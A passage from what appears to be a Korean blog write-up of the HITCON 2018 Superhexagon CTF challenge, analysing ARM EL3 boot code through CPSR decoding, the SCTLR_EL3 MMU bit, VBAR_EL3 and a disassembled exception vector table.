</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> FIQ:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;FIQ_MASKED | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> is_thumb:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;THUMB_MODE | &#39;</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;COND_</span><span style="color:#e6db74">{</span>hex(cond)[<span style="color:#ae81ff">2</span>:]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>        print(re)
</span></span><span style="display:flex;"><span>CPSR()
</span></span></code></pre></div><p>gdb에 로드하고 0x0 번지부터 cpsr의 값을 확인해보면 다음과 같다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>gef<span style="color:#f92672">&gt;</span> cpsr
</span></span><span style="display:flex;"><span>EL3h<span style="color:#f92672">|</span> FIQ_MASKED <span style="color:#f92672">|</span> COND_8
</span></span></code></pre></div><p>초기 부팅시에 코드는 EL3 코드라는 것을 알 수 있다.</p>
<h2 id="sctlr_elx-structure">SCTLR_ELx structure<a hidden class="anchor" aria-hidden="true" href="#sctlr_elx-structure">#</a></h2>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/614c0e573a0fe490fca6d99bab45f918.png" alt=""  />

초기에 EL3로 부팅을 시작하고, 이때 virtual memory system이 활성화 되었는지 확인해야한다.
M bit를 확인하면 된다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/f28a62576fc1c8773612ae36b684f334.png" alt=""  />

앞서 arm manual을 정리하면서 관련 내용을 다뤘다.
arm 프로세서는 power up시에 cold reset이 수행된다.
여기선 warm reset시 M bit가 0으로 세팅된다고 하지만, 앞서 정리한 메뉴얼에선 warm reset에서 reset되는 필드는 모두 cold reset에서도 reset된다고 설명했었다.
그렇기에 SCTLR_EL3.M bit는 0으로 IMPLEMENTATION DEFINED 값이다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/db5e56cda131c84f583ddbb15fa986ae.png" alt=""  />

실제로도 0으로 세팅되어있는 것을 볼 수 있다.
0x0 번지부터 실행될 때에는 당연하지만 가상 주소가 꺼져있음을 알 수 있다.</p>
<h2 id="identifying-exception-handlers">Identifying exception handlers<a hidden class="anchor" aria-hidden="true" href="#identifying-exception-handlers">#</a></h2>
<h3 id="vbar_elx-structure">VBAR_ELx structure<a hidden class="anchor" aria-hidden="true" href="#vbar_elx-structure">#</a></h3>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/4da5ac19604f5758778b401642aae59b.png" alt=""  />

exception이 일어나면 exception vector에 등록된 handler가 호출된다.</p>
<h3 id="exception-vector-structure">Exception vector structure<a hidden class="anchor" aria-hidden="true" href="#exception-vector-structure">#</a></h3>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/46a3de22d67a2d11bc915aad8668153d.png" alt=""  />

0x80 align 되어있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#ae81ff">00000010</span> <span style="color:#ae81ff">80</span>  ff  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">10</span>    adr        x0,<span style="color:#ae81ff">0x2000</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000014</span> <span style="color:#ae81ff">00</span>  c0  <span style="color:#ae81ff">1</span>e  d5    msr        vbar_el3 ,x0
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000001</span><span style="color:#ae81ff">8</span> df  <span style="color:#ae81ff">3f</span>  <span style="color:#ae81ff">03</span>  d5    isb
</span></span></code></pre></div><p>이제 exception vector가 어떻게 생겼는지 알고 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>define RAMLIMIT_GB <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>define <span style="color:#a6e22e">RAMLIMIT_BYTES</span> (RAMLIMIT_GB <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024ULL</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> MemMapEntry memmap[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#75715e">/* Space up to 0x8000000 is reserved for a boot ROM */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_FLASH] <span style="color:#f92672">=</span>              {          <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x08000000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_CPUPERIPHS] <span style="color:#f92672">=</span>         { <span style="color:#ae81ff">0x08000000</span>, <span style="color:#ae81ff">0x00020000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_UART] <span style="color:#f92672">=</span>               { <span style="color:#ae81ff">0x09000000</span>, <span style="color:#ae81ff">0x00001000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_SECURE_MEM] <span style="color:#f92672">=</span>         { <span style="color:#ae81ff">0x0e000000</span>, <span style="color:#ae81ff">0x01000000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_MEM] <span style="color:#f92672">=</span>                { <span style="color:#ae81ff">0x40000000</span>, RAMLIMIT_BYTES },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>};
</span></span></code></pre></div><p>앞서 물리 메모리 레이아웃을 patch 파일을 통해 식별했다.
VIRT_FLASH 부터 적재되었고, phyiscal address를 쓰니 0x2000 그대로 상수값대로 접근하면 될 것이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>                             LAB_00002000                                    XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     FUN_000b8244:<span style="color:#ae81ff">000</span>b8344 (<span style="color:#f92672">*</span>)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002000</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002004</span> <span style="color:#ae81ff">79</span>  fb  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000200</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">76</span>  fb  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000200</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002010</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       db[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000020</span><span style="color:#ae81ff">80</span> <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000020</span><span style="color:#ae81ff">84</span> <span style="color:#ae81ff">59</span>  fb  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000020</span><span style="color:#ae81ff">88</span> <span style="color:#ae81ff">56</span>  fb  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000020</span><span style="color:#ae81ff">8</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000020</span><span style="color:#ae81ff">90</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002100</span> <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002104</span> <span style="color:#ae81ff">39</span>  fb  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000210</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">36</span>  fb  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000210</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002110</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000021</span><span style="color:#ae81ff">80</span> <span style="color:#ae81ff">60</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000021</span><span style="color:#ae81ff">84</span> <span style="color:#ae81ff">19</span>  fb  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000021</span><span style="color:#ae81ff">88</span> <span style="color:#ae81ff">16</span>  fb  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000021</span><span style="color:#ae81ff">8</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000021</span><span style="color:#ae81ff">90</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002200</span> <span style="color:#ae81ff">80</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002204</span> f9  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000220</span><span style="color:#ae81ff">8</span> f6  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000220</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002210</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000022</span><span style="color:#ae81ff">80</span> a0  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x5</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000022</span><span style="color:#ae81ff">84</span> d9  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000022</span><span style="color:#ae81ff">88</span> d6  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000022</span><span style="color:#ae81ff">8</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000022</span><span style="color:#ae81ff">90</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002300</span> c0  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x6</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002304</span> b9  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000230</span><span style="color:#ae81ff">8</span> b6  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000230</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002310</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000023</span><span style="color:#ae81ff">80</span> e0  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x7</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000023</span><span style="color:#ae81ff">84</span> <span style="color:#ae81ff">99</span>  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000023</span><span style="color:#ae81ff">88</span> <span style="color:#ae81ff">96</span>  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000023</span><span style="color:#ae81ff">8</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000023</span><span style="color:#ae81ff">90</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002400</span> ff  <span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">03</span>  d5    msr        DAIFClr,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002404</span> fe  <span style="color:#ae81ff">7</span>b  <span style="color:#ae81ff">00</span>  f9    str        x30 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xf0</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000240</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">1</span>e  <span style="color:#ae81ff">52</span>  <span style="color:#ae81ff">3</span>e  d5    mrs        x30 ,esr_el3
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000240</span>c de  <span style="color:#ae81ff">7f</span>  <span style="color:#ae81ff">5</span>a  d3    ubfx       x30 ,x30 ,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x1a</span> ,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x6</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002410</span> df  <span style="color:#ae81ff">5f</span>  <span style="color:#ae81ff">00</span>  f1    cmp        x30 ,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002414</span> <span style="color:#ae81ff">61</span>  <span style="color:#ae81ff">1f</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">54</span>    b.ne       LAB_00002800
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000241</span><span style="color:#ae81ff">8</span> fd  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">14</span>    b          LAB_0000280c
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000241</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">100</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000024</span><span style="color:#ae81ff">80</span> <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x9</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000024</span><span style="color:#ae81ff">84</span> <span style="color:#ae81ff">59</span>  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000024</span><span style="color:#ae81ff">88</span> <span style="color:#ae81ff">56</span>  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000024</span><span style="color:#ae81ff">8</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000024</span><span style="color:#ae81ff">90</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002500</span> <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xa</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002504</span> <span style="color:#ae81ff">39</span>  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000250</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">36</span>  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000250</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002510</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000025</span><span style="color:#ae81ff">80</span> <span style="color:#ae81ff">60</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xb</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000025</span><span style="color:#ae81ff">84</span> <span style="color:#ae81ff">19</span>  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000025</span><span style="color:#ae81ff">88</span> <span style="color:#ae81ff">16</span>  fa  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000025</span><span style="color:#ae81ff">8</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000025</span><span style="color:#ae81ff">90</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002600</span> ff  <span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">03</span>  d5    msr        DAIFClr,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002604</span> fe  <span style="color:#ae81ff">7</span>b  <span style="color:#ae81ff">00</span>  f9    str        x30 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xf0</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000260</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">1</span>e  <span style="color:#ae81ff">52</span>  <span style="color:#ae81ff">3</span>e  d5    mrs        x30 ,esr_el3
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000260</span>c de  <span style="color:#ae81ff">7f</span>  <span style="color:#ae81ff">5</span>a  d3    ubfx       x30 ,x30 ,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x1a</span> ,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x6</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002610</span> df  <span style="color:#ae81ff">4f</span>  <span style="color:#ae81ff">00</span>  f1    cmp        x30 ,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x13</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002614</span> <span style="color:#ae81ff">61</span>  <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">54</span>    b.ne       LAB_00002800
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000261</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">7</span>d  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">14</span>    b          LAB_0000280c
</span></span><span style="display:flex;"><span>                             ARRAY_0000261c[<span style="color:#ae81ff">52</span>]                              XREF[<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>]<span style="color:#f92672">:</span>   <span style="color:#ae81ff">000</span>bc070 (<span style="color:#f92672">*</span>) , <span style="color:#ae81ff">000</span>bc078 (<span style="color:#f92672">*</span>)   
